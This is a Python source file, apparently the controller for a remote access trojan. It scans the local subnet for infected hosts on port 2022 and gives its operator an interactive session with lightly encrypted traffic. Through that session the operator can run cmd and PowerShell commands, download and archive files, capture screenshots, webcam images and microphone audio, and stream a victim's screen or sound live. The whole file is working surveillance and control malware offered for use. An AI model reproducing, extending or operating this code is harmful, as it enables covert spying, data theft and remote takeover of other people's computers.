# CREATOR 
# GitHub https://github.com/cppandpython
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 17

# DATE: 02.02.2026
# APP: SESSION
# TYPE: SOCKET_BOT
# VERSION: LATEST
# PLATFORM: ANY




#
#-
#--
#---
#----
#-----
#------
PORT = 2022 # RESPONSIBLE FOR SERVER PORT
#------
#-----
#----
#---
#--
#-
#




from os import abort, path, mkdir, name as os_name, system as shell
from socket import socket, AF_INET, SOCK_STREAM, SOCK_DGRAM
from concurrent.futures import ThreadPoolExecutor
from webbrowser import open as open_html
from ipaddress import ip_network
from random import seed, randint
from datetime import datetime
from time import sleep


SEP = b'\0'


def init_session(ip, info):
    global PATH_DOWNLOADS, PATH_ZIP, PATH_SCREENSHOT, PATH_WEBCAMSHOT, PATH_AUDIO, PATH_SHARE

    PATH = f'session-{ip}'
    FILE_INFO = path.join(PATH, 'info.txt')
    PATH_DOWNLOADS = path.join(PATH, 'downloads')
    PATH_ZIP = path.join(PATH, 'zip')
    PATH_SCREENSHOT = path.join(PATH, 'screenshot')
    PATH_WEBCAMSHOT = path.join(PATH, 'webcamshot')
    PATH_AUDIO = path.join(PATH, 'audio')
    PATH_SHARE = path.join(PATH, 'share')

    for n in [PATH, PATH_DOWNLOADS, PATH_ZIP, PATH_SCREENSHOT, PATH_WEBCAMSHOT, PATH_AUDIO, PATH_SHARE]:
        if not path.isdir(n):
            mkdir(n)

    if not path.isfile(FILE_INFO):
        with open(FILE_INFO, 'w') as f:
            f.write(info)


def get_date():
    try:
        now = datetime.now()

        return [now.strftime('%H-%M-%S'), now.strftime('%d.%m.%Y')]
    except:
        return ['00-00-00', '00.00.0000']
    

def clear():
    shell('cls' if os_name == 'nt' else 'clear')


def ctrl_c(exit_):
    while True:
        try:
            clear()

            if input('Do you want to exit\nYes\\No: ').strip().lower() == 'yes':
                return exit_() 
            else: 
                clear()
                break
        except:
            continue


def encrypt(data):
    return ''.join([chr((ord(n) << KEY[0]) ^ KEY[1]) for n in data])


def decrypt(data):
    return ''.join([chr((ord(n) ^ KEY[1]) >> KEY[0]) for n in data])


def send(sock, data, doc=''):
    if isinstance(data, str):
        data = encrypt(data).encode()
    
    sock.sendall(data + SEP)


def recv(sock, b=False):
    data = bytearray()

    while True:
        chunk = sock.recv(8192)

        if not chunk:
            break

        data.extend(chunk) 

        if data.endswith(SEP):
            data.pop()
            break 

    return decrypt(data.decode()) if not b else data


def get_ip():
    try:
        with socket(AF_INET, SOCK_DGRAM) as sock:
            sock.connect(('203.0.113.42', 4242))
            return sock.getsockname()[0]
    except:
        raise ValueError('ip is empty')
        

def check_ip(ip):
    ip = str(ip)

    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.settimeout(1)

        try:
            sock.connect((ip, PORT)), sock.sendall(b'0x1155cea24bacb916')
            server_seed = int(sock.recv(1024).decode())
            return [ip, server_seed]
        except:
            return False
        

def find_server(ip):
    mask = ip_network(ip[:ip.rindex('.') + 1] + '0/24').hosts()

    with ThreadPoolExecutor(max_workers=20) as pool:
        found = [n for n in pool.map(check_ip, mask) if n]

    return found


def connect_server(ip, seed_):
    global KEY

    seed(seed_)
    KEY = (randint(1, 7), randint(1, 255))

    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.connect((ip, PORT)), sock.sendall(b'0x7294cc821afdc797')

        clear(), print(recv(sock))

        sock.sendall(b'0x628057b78a560e64')
        node = recv(sock)

        sock.sendall(b'0x3856b3888f50563b')
        info = recv(sock)

        while True:
            init_session(ip, info), sock.sendall(b'0x403d9ff550597db8')
             
            try:
                cmd = input(f'{ip}@{node}> ').strip()
            except KeyboardInterrupt:
                if ctrl_c(lambda: True):
                    send(sock, 'exit'), clear(), print(f'session is left ({ip}) [+]'), sleep(3), clear()   
                    return
                
                send(sock, 'clear')
                continue
            except:
                send(sock, 'clear')
                continue
            
            match cmd:
                case 'exit':
                    send(sock, 'exit'), clear(), print(f'session is left ({ip}) [+]'), sleep(3), clear()
                    return
                case 'clear':
                    send(sock, 'clear'), clear()
                case 'cat' | 'audio' | 'share':
                    send(sock, cmd), print(recv(sock))
                case 'zip':
                    send(sock, 'zip')

                    zip_path = path.join(PATH_ZIP, recv(sock))
                    sock.sendall(b'0x56f347625c8f5549')
                    zip_data = recv(sock, b=True)

                    if zip_data == SEP:
                        print('failed to make archive [-]')
                        continue

                    with open(zip_path, 'wb') as f:
                        f.write(zip_data)

                    print(f'{zip_path} [+]')    
                case 'screen -s' | 'webcam' as shot:
                    is_screen = shot == 'screen -s'

                    send(sock, shot)

                    stime, sdate = get_date()
                    shot_path = path.join(PATH_SCREENSHOT if is_screen else PATH_WEBCAMSHOT, f'{stime}_{sdate}.png')

                    png = recv(sock, b=True)

                    if png.startswith(SEP):
                        print('failed to take screenshot [-]' if is_screen else 'failed to take screenshot from webcam [-]')
                        continue

                    with open(shot_path, 'wb') as f:
                        f.write(png)

                    print(f'{shot_path} [+]')
                case _:
                    if cmd.startswith('cat'):
                        send(sock, cmd)

                        cat_path = path.join(PATH_DOWNLOADS, recv(sock))
                        sock.sendall(b'0x53f17505eea476c0')
                        cat_data = recv(sock, b=True)

                        if cat_data == SEP:
                            print(f'failed to download file [-]')
                            continue

                        with open(cat_path, 'wb') as f:
                            f.write(cat_data)

                        print(f'{cat_path} [+]')  
                    elif cmd.startswith('cmd') or cmd.startswith('powershell'):
                        send(sock, cmd)

                        while True:
                            cmd_path = recv(sock)

                            try:
                                wincmd = input(cmd_path).strip()
                            except KeyboardInterrupt:
                                print(), send(sock, 'exit')
                                break
                            except:
                                send(sock, 'next')
                                continue

                            if (wincmd == '') or (wincmd == 'cmd') or (wincmd == 'powershell'):
                                send(sock, 'next')
                            elif wincmd == 'clear':
                                clear(), send(sock, 'next')                           
                            elif wincmd == 'exit':
                                print(), send(sock, 'exit')
                                break
                            else:
                                send(sock, wincmd), print(recv(sock))   
                    elif cmd.startswith('audio') and ('-p' not in cmd):
                        send(sock, cmd), print(recv(sock)), sock.sendall(b'0x75d4bbca044e8c63')
                        
                        stime, sdate = get_date()
                        audio_path = path.join(PATH_AUDIO, f'{stime}_{sdate}.mp3')
                        audio_data = recv(sock, b=True)

                        if audio_data == SEP:
                            print('failed to record audio [-]')
                            continue
                        
                        with open(audio_path, 'wb') as f:
                            f.write(audio_data)

                        print(f'{audio_path} [+]')  
                    elif cmd.startswith('share'):
                        send(sock, cmd)

                        index_html = path.join(PATH_SHARE, 'index.html')
                        img_png = path.join(PATH_SHARE, 'img.png')
                        audio_mp3 = path.join(PATH_SHARE, 'audio.mp3')

                        if '-a' in cmd:
                            with open(index_html, 'w') as f:
                                f.write(f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="3">
    <title>{node}</title>
</head>
<body>
    <audio controls autoplay loop>
        <source src="{path.abspath(audio_mp3)}" type="audio/mpeg">
    </audio>
</body>
</html>''')
                            
                            print(f'{index_html} [+]')
                            try:
                                open_html(index_html)
                            except: ...
                            print('ctrl + c  —  Stop share')

                            while True:
                                with open(audio_mp3, 'wb') as f:
                                    f.write(recv(sock, b=True))
                                    
                                sock.sendall(b'0x213f13f279d00a91')

                                try:
                                    sleep(2)
                                except:
                                    recv(sock, b=True), sock.sendall(b'0x2a44738d62feabcf')
                                    break

                            continue    

                        with open(index_html, 'w') as f:
                            f.write(f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="2">
    <title>{node}</title>''' + '''
    <style>
        img { max-width: 100%; }
    </style>''' + f'''
</head>
<body>
    <img src="{path.abspath(img_png)}" width="500" alt="img" title="img">
</body>
</html>''')

                        print(f'{index_html} [+]')
                        try:
                            open_html(index_html)
                        except: ...
                        print('ctrl + c  —  Stop share')
                            
                        while True:
                            with open(img_png, 'wb') as f:
                                f.write(recv(sock, b=True))

                            sock.sendall(b'0x213f13f279d00a91')
                            
                            try:
                                sleep(2)
                            except:
                                recv(sock, b=True), sock.sendall(b'0x2a44738d62feabcf')
                                break
                    else:
                        send(sock, cmd), print(recv(sock), flush=True)


def main():
    if not isinstance(PORT, int):
        raise TypeError('(PORT) must be (int)')

    if PORT < 1:
        raise ValueError('(PORT) is invalid')

    clear()

    while True:
        print('AUTHOR: Vladislav Khudash')

        try:
            is_find = input('\nDo you want to find sessions\nYes\\No: ').strip().lower()
        except KeyboardInterrupt:
            ctrl_c(abort)
            continue
        except:
            clear()
            continue

        if is_find == 'exit':
            clear(), abort() 

        is_find = is_find == 'yes'

        if not is_find:
            clear()
            continue

        try:
            ip = get_ip()
        except ValueError:
            clear(), print('failed to get your ip [-]'), sleep(3), clear()
            continue

        clear(), print('find for sessions has started [*]')

        found_session = find_server(ip)

        if not found_session:
            clear(), print('sessions not found [-]'), sleep(3), clear()
            continue
        
        clear()

        sessions = {}
        sid = 0

        for n in found_session:
            sip, sseed = n[0], n[1]

            sessions[str(sid)] = [sip, sseed]
            print(f'id: {sid} | session: {sip}')
            sid += 1

        print_sessions = sessions.items()
        
        while True:
            try:
                session_id = input('\nEnter session id: ').strip()
            except KeyboardInterrupt:
                if ctrl_c(lambda: True):
                    clear()     
                    break
                
                session_id = ''
            except:
                clear()
                continue

            if session_id == 'exit':
                clear()
                break

            session = sessions.get(session_id)

            if session is None:
                clear()

                for (sid, sip) in print_sessions:
                    print(f'id: {sid} | session: {sip[0]}')

                continue

            server_ip, server_seed = session

            try:
                connect_server(server_ip, server_seed)
            except ConnectionError:
                clear(), print(f'connection to session was interrupted ({server_ip}) [-]'), sleep(3), clear()
            except BaseException as error:
                clear(), print(f'session was interrupted ({server_ip}) [-]\n{type(error).__name__}({error})'), sleep(3), clear()

            clear()
            break



if __name__ == '__main__': main()
